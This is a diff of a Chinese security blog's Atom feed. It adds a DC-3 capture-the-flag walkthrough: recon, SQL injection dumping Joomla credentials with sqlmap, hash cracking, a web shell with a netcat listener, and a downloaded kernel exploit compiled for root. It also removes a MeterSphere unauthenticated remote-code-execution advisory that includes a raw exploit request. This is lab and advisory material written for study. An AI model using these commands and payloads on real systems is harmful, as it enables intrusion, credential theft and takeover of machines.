@@ -2,13 +2,85 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-04-01T13:14:24.104Z</updated>
+    <updated>2022-04-13T11:41:58.031Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
     <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
     <icon>https://V-alkoinen.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 老白</rights>
+    <entry>
+        <title type="html"><![CDATA[DC-3]]></title>
+        <id>https://V-alkoinen.github.io/post/dc-3/</id>
+        <link href="https://V-alkoinen.github.io/post/dc-3/">
+        </link>
+        <updated>2022-04-09T11:14:10.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="目标机器">目标机器</h1>
+<p>  DC-3 172.16.70.155</p>
+<h1 id="过程">过程</h1>
+<p>  nmap扫一下端口和服务<br>
+  <code>nmap -A -T4 -sV -O -p- 172.16.70.155</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649848593916.png" alt="" loading="lazy"><br>
+  发现一个<code>joomla</code><br>
+  爆破一下目录<code>dirb http://172.16.70.155</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649848761350.png" alt="" loading="lazy"><br>
+  扫到了administrator目录<br>
+  <code>joomscan -u http://172.16.70.155</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849010969.png" alt="" loading="lazy"><br>
+  发现版本为3.7，exploitdb找一下<br>
+  <code>searchsploit joomla 3.7</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849088813.png" alt="" loading="lazy"><br>
+  <code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849123284.png" alt="" loading="lazy"><br>
+  直接上SQLMAP<br>
+  <code>sqlmap -u &quot;http://172.16.70.155/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849166250.png" alt="" loading="lazy"><br>
+  <code>sqlmap -u &quot;http://172.16.70.155/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb –tables</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849202458.png" alt="" loading="lazy"><br>
+  找到一个users表<br>
+  <code>sqlmap -u &quot;http://172.16.70.155/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' --dump</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849239793.png" alt="" loading="lazy"><br>
+  用join跑一下<br>
+  <code>john 1.txt</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849296584.png" alt="" loading="lazy"><br>
+  登陆后台<br>
+  <code>http://172.16.70.155/administrator/index.php	admin snoopy</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849348346.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849359827.png" alt="" loading="lazy"><br>
+  写一个马<br>
+<img src="https://V-alkoinen.github.io/post-images/1649849376952.png" alt="" loading="lazy"></p>
+<pre><code>nc –nvlp 9999
+http://172.16.70.155/templates/beez3//html/1.php
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1649849407505.png" alt="" loading="lazy"><br>
+  试一下suid</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid.py
+chmod +x suid.py
+python suid.py
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1649849466970.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649849472092.png" alt="" loading="lazy"></p>
+<pre><code>cat /proc/version
+cat /etc/issue
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1649849502745.png" alt="" loading="lazy"><br>
+  <code>searchsploit ubuntu 16.04</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649850024090.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649850032190.png" alt="" loading="lazy"><br>
+  <code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649850053274.png" alt="" loading="lazy"></p>
+<pre><code>unzip 397
+tar -xvf exp
+cd 39772
+./compile.sh
+./doubleput
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1649850091574.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649850095945.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649850100090.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2022-0847 DirtyPipe]]></title>
         <id>https://V-alkoinen.github.io/post/cve-2022-0847-dirtypipe/</id>
@@ -579,45 +651,6 @@ wmic /node:'ad-m' process call create &quot;cmd /c powershell Set-ADObject -Iden
  4、后续即使修改域管密码，我们依然可以通过我们创建的机器账户回复域管权限（可以使用mimikatz同步哈希）<br>
 <code>runas /user:&lt;domain&gt;\SecTest2$ /netonly cmd1</code><br>
 <img src="https://V-alkoinen.github.io/post-images/1642847979300.png" alt="" loading="lazy"></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[MeterSphere未授权远程代码执行]]></title>
-        <id>https://V-alkoinen.github.io/post/metersphere-wei-shou-quan-yuan-cheng-dai-ma-zhi-xing/</id>
-        <link href="https://V-alkoinen.github.io/post/metersphere-wei-shou-quan-yuan-cheng-dai-ma-zhi-xing/">
-        </link>
-        <updated>2022-01-11T10:21:07.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-metersphere">一、MeterSphere</h1>
-<p>  <code>MeterSphere</code> 是一站式开源持续测试平台，涵盖测试跟踪、接口测试、性能测试、 团队协作等功能，该漏洞由于自定义插件功能处存在权限验证缺陷，致使攻击者无需经过身份验证即可通过构造特定的请求在目标系统上远程执行任意代码。</p>
-<h1 id="二-影响版本">二、影响版本</h1>
-<p>  <code>v1.13.0 &lt;= MeterSphere &lt;= v1.16.3</code></p>
-<h1 id="三-漏洞复现">三、漏洞复现</h1>
-<p>  MeterSphere安装</p>
-<pre><code>wget https://github.com/metersphere/metersphere/releases/download/v1.16.3/metersphere-online-installer-v1.16.3.tar.gz
-tar zxvf metersphere-online-installer-v1.16.3.tar.gz
-cd metersphere-online-installer-v1.16.3/
-MSVERSION=&quot;v1.16.3&quot;
-sed -i -e &quot;s#MS_IMAGE_TAG=.*#MS_IMAGE_TAG=${MSVERSION}#g&quot; install.conf
-sed -i -e &quot;s#MS_IMAGE_PREFIX=.*#MS_IMAGE_PREFIX=registry.cn-qingdao.aliyuncs.com\/metersphere#g&quot; install.conf
-/bin/bash install.sh
-</code></pre>
-<p>  访问 http://&lt;IP&gt;:8081<br>
-<img src="https://V-alkoinen.github.io/post-images/1644666257791.png" alt="" loading="lazy"><br>
-  发送如下数据包：</p>
-<pre><code>
-POST /plugin/customMethod HTTP/1.1
-Host: ip:8081
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/75.0.3770.100 Safari/537.36
-Content-Length: 34
-Content-Type: application/json
-Accept-Encoding: gzip, deflate
-Connection: close
-
-{&quot;entry&quot;: &quot;Evil&quot;, &quot;request&quot;: &quot;id&quot;}
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644732300537.png" alt="" loading="lazy"></figure>
-<h1 id="四-漏洞修复">四、漏洞修复</h1>
-<p>升级<code>MeterSphere</code> 至v1.16.4及以上版本<a href="https://community.fit2cloud.com/#/products/metersphere/downloads">https://community.fit2cloud.com/#/products/metersphere/downloads</a></p>
 ]]></content>
     </entry>
 </feed>
